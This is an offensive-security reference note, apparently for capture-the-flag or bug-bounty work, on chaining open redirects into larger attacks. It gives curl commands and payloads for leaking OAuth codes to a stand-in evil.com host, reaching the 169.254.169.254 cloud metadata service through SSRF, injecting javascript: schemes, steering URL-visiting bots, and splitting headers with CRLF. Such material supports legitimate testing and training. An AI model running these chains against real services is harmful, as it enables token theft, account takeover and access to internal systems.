# Chain routes — what the redirect launders (the payoff)

## The model — the redirect alone is low-value

```text
open-redirect ALONE  -> a phishing link (low impact, often out-of-scope)
open-redirect -> OAUTH -> a stolen code/token (the chain)
open-redirect -> SSRF  -> a server-side fetch to the canary (the chain)
open-redirect -> XSS   -> a javascript:/data: scheme (the chain)
open-redirect -> a BOT -> a bot visits the attacker URL (the chain)
```

The class's value is the DOWNSTREAM trust — the chain routes are the
flag-closing paths.

## Route 1 — open-redirect → OAuth (the code/token leak)

```text
the OAuth flow: /authorize?client_id=X&redirect_uri=<ALLOWLISTED>
the allowlist:  redirect_uri must be https://target.com/* (a prefix/contains)
the gap:        an open-redirect ON target.com
the chain:      redirect_uri = https://target.com/redirect?next=https://evil.com
                -> the OAuth server redirects to target.com/redirect
                -> target.com/redirect open-redirects to evil.com
                -> evil.com receives ?code=<the-auth-code> or #access_token=<token>
```

```bash
# the canary — the oauth redirect_uri through the open redirect
curl -si "https://oauth.target.com/authorize?client_id=X&redirect_uri=https%3A%2F%2Ftarget.com%2Fredirect%3Fnext%3Dhttps%253A%252F%252Fevil.com" \
  | grep -i '^location'
# Location: https://target.com/redirect?next=https://evil.com -> target.com redirects -> evil.com?code=...
```

The skill-route: `web-oauth-sso` — the redirect_uri laundering. The
`state`/`nonce`/PKCE chain and the implicit-flow `#access_token` leak
through a fragment.

## Route 2 — open-redirect → SSRF (the server-side fetch)

```text
a feature fetches a URL (a webhook/preview/proxy/importer)
the fetcher is allowlist-checked OR follows redirects
the gap:   a redirect the fetcher follows to an internal host
the chain: fetch(http://target.com/redirect?next=http://169.254.169.254/)
           -> the fetcher follows the redirect to the metadata IP
```

```bash
# the fetch + the redirect-chain — does the fetcher follow Location?
curl -s "$BASE/fetch?url=http://target.com/redirect%3Fnext%3Dhttp%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data"
```

The skill-route: `web-ssrf` — a fetcher that follows `Location` reaches the
internal host even when the fetcher URL is allowlist-checked to `target.com`.

## Route 3 — open-redirect → XSS (the javascript:/data: scheme)

```text
the redirect target is placed in a client-side sink (location.href, a link)
the filter checks the host/scheme loosely
the payload: javascript:alert(1) / data:text/html,<script>... — a scheme
             the host-check doesn't reject
```

```bash
curl -s "$BASE/login?next=javascript%3Aalert(1)" | grep -i 'location\|href'
# Location: javascript:alert(1)   -> a JS scheme in the header (some browsers block)
# <a href="javascript:alert(1)">  -> a reflected link (the click)
```

The skill-route: `web-xss` — the `javascript:`/`data:` scheme reaching a sink.

## Route 4 — open-redirect → a bot click (the phishing/automation)

```text
a "report this URL" / "share a link" / a preview bot visits attacker URLs
the bot is on a privileged origin / a headless browser
the chain: the bot visits the target's login?next=https://evil.com
           -> the target 302s -> the bot lands on evil.com
           -> evil.com serves a phishing page / a CSRF / a token-stealer
```

The skill-route: the bot-automation chain — `web-chromedriver`/the
admin-bot — a redirect laundering the bot onto attacker-controlled content
that exfiltrates.

## Route 5 — open-redirect → a trusted-domain launder (phishing)

```text
https://target.com/login?next=https://evil.com — the URL starts on the
trusted target.com; the victim clicks a "target.com" link that lands on
evil.com — a domain-reputation launder.
```

The simplest chain — the phishing angle; often the intended impact in a CTF.

## Route 6 — open-redirect → CRLF / header-injection (the %0d%0a)

```text
the param lands in the Location: header
the payload: %0d%0aSet-Cookie:%20session=evil — a CRLF splitting the
             Location header, injecting a Set-Cookie / a second response
```

```bash
curl -si "$BASE/login?next=%2f%0d%0aSet-Cookie:%20x%3Dy" | head -5
# two headers from one param -> the header-injection twin
```

The skill-route: `web-crlf`/header-injection — a sibling of the redirect
class (the param reaches a header, so CRLF is a sibling payload).

## The chain-selection table

| The downstream trust | The chain | The skill |
|---|---|---|
| an OAuth redirect_uri allowlist | open-redirect -> code/token leak | `web-oauth-sso` |
| a URL-fetcher that follows redirects | open-redirect -> SSRF | `web-ssrf` |
| a client-side sink with a scheme | open-redirect -> XSS | `web-xss` |
| a bot that visits URLs | open-redirect -> bot content | `web-chromedriver`/bot |
| the domain reputation | open-redirect -> phishing | this class |
| the Location header bytes | open-redirect -> CRLF | `web-crlf`/header-inj |

## The chain-record

`chain: open-redirect -> <the-downstream-trust>: <the-payload-shape>: <the
oracle>` — the redirect is hop-1; the laundered trust is hop-2; the flag
is hop-3.
